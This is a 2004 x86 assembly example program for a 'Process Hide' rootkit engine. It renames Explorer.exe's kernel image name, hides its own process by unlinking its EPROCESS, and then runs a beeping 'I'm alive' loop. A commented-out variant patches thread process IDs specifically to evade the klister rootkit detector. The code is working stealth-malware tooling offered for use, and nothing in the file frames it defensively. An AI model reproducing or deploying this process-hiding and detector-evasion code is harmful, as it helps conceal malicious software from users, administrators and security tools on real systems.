;
;  PROJECT:         Process Hide
;  FILE:            test.asm
;  PURPOSE:         how-to-use example code
;  VERSION:         1.0
;
;  PROGRAMMER:      90210//HI-TECH
;
;
;
; History:
;	2004/01/25 90210 initial release
;

.586p
.model          flat,STDCALL

include		phide.ash

extrn		WriteConsoleA		: proc
extrn		GetStdHandle		: proc
extrn		wsprintfA		: proc
extrn		ExitProcess		: proc
extrn		Beep			: proc
extrn		Sleep			: proc
extrn		GetCurrentProcessId	: proc
extrn		FindWindowA		: proc
extrn		GetWindowThreadProcessId: proc

STD_OUTPUT_HANDLE       EQU     -11

.data
szMyEPTmpl	db	'My EPROCESS is located at 0x%08x',13,10,0
szAliveTmpl	db	'I''m alive: 0x%08x',13,0
szRetTmpl	db	'Engine returns: %s',13,10,0

szPM		db	'Program Manager',0
szNewName	db	'hi guys!',0
szRenExplorer	db	'Trying to rename "Explorer.exe" to "%s"',13,10,0
szExplorerPid	db	'Explorer.exe PID is %d...',13,10,0
szHideMyself	db	'Trying to hide myself. My PID is %d...',13,10,0
szNoExplorer	db	'Explorer''s "Program Manager" window not found.',13,10
cNoExplorerSize=$-szNoExplorer

; hey, this is just an engine test, not a size-optimising compo ;)
pBugs		dd	offset szSuccess
		dd	offset szGeneral
		dd	offset szNotFound
		dd	offset szNoName
		dd	offset szNoMemory
		dd	offset szNoNtoskrnl
		dd	offset szCantOpen
		dd	offset szCantLoad
		dd	offset szNoPAPH
		dd	offset szCantMap
		dd	offset szCantLock
		dd	offset szNoFreeDesc
		dd	offset szNotSupported
		
szSuccess	db	'Success',0
szGeneral	db	'PH_ERR_GENERAL',0
szNotFound	db	'PH_ERR_PROCESS_NOT_FOUND',0
szNoName	db	'PH_ERR_MUST_SPECIFY_NAME',0
szNoMemory	db	'PH_ERR_NOT_ENOUGH_MEMORY',0
szNoNtoskrnl	db	'PH_ERR_CANT_FIND_NTOSKRNL',0
szCantOpen	db	'PH_ERR_CANT_OPEN_SECTION',0
szCantLoad	db	'PH_ERR_CANT_LOAD_NTOSKRNL',0
szNoPAPH	db	'PH_ERR_CANT_FIND_PAPH',0
szCantMap	db	'PH_ERR_CANT_MAP_SECTION',0
szCantLock	db	'PH_ERR_CANT_LOCK_PAGES',0
szNoFreeDesc	db	'PH_ERR_CANT_FIND_FREE_DESCRIPTOR',0
szNotSupported	db	'PH_ERR_OS_NOT_SUPPORTED',0


szOutBuff	db	100 dup (?)

.code

start:		call	GetStdHandle,STD_OUTPUT_HANDLE
                xchg	ebx,eax

		call	print_text,offset szRenExplorer,offset szNewName

		call	FindWindowA,0,offset szPM
		or	eax,eax
		jnz	explorer_found

		push	eax
		mov	ecx,esp
		
		call	WriteConsoleA,ebx,offset szNoExplorer,cNoExplorerSize,ecx,eax
		pop	eax
		jmp	no_explorer

explorer_found:	push	0			; EPROCESS isn't needed
		push	offset szNewName	; new explorer image name
		push	PH_PROCESS_BY_PID+PH_CHANGE_IMGNAME	; find by pid, 
								; change image file name

		push	eax			; will have explorer's PID
		call	GetWindowThreadProcessId,eax,esp		

		call	print_text,offset szExplorerPid,dword ptr [esp]

		call	ProcessHide		; call the engine

		lea	esi,[pBugs+eax*4]
		call	print_text,offset szRetTmpl,dword ptr [esi]

no_explorer:	mov	ebp,1000
		call	GetCurrentProcessId	; let's hide ourselves

		push	eax
		push	esp			; ppEPROCESS

		push	0			; pNewImgName is NULL

		push	PH_PROCESS_BY_PID+PH_EXCLUDE_EPROCESS
						; find by pid, hide EPROCESS, 
						; get EPROCESS pointer

; uncomment this and comment previous "push" if you want to hide from klister

;		push	PH_PROCESS_BY_PID+PH_EXCLUDE_EPROCESS+PH_CHANGE_THREADS_PID
;						; find by pid, hide EPROCESS, 
;						; patch UniqueProcess from all threads to 8,
;						; get EPROCESS pointer

		push	eax			; Pid or EPROCESS

		call	print_text,offset szHideMyself,eax

		call	ProcessHide
		pop	ecx			; ppEPROCESS

		lea	esi,[pBugs+eax*4]
		pushad
		call	print_text,offset szRetTmpl,dword ptr [esi]
		popad

		or	eax,eax
		jz	start_ticking

		call	ExitProcess,eax	; uExitCode!=0

start_ticking:	call	print_text,offset szMyEPTmpl,ecx
		xor	edi,edi

new_tick:	call	print_text,offset szAliveTmpl,edi
		call	Beep,ebp,100
		
		inc	edi
		call	Sleep,ebp
		jmp	new_tick

print_text:	lea	esi,szOutBuff
		call	wsprintfA,esi,dword ptr [esp+8],dword ptr [esp+8]
		mov	ecx,esp
		call	WriteConsoleA,ebx,esi,eax,ecx,0
		add	esp,4*3
		ret	8
end 		start